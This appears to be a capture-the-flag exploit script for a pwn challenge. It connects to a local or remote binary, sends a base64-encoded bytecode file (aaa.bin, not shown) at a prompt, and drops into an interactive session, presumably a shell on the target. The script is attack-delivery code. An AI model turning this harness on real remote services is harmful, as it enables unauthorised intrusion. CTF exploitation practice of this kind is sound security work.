#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *
import base64

cli_script()

io: tube = gift.io

ru(b"Enter base64 encoded mixtape bytecode\n")
ru(b">> ")
sl(base64.b64encode(open("./aaa.bin", "rb").read()))

ia()
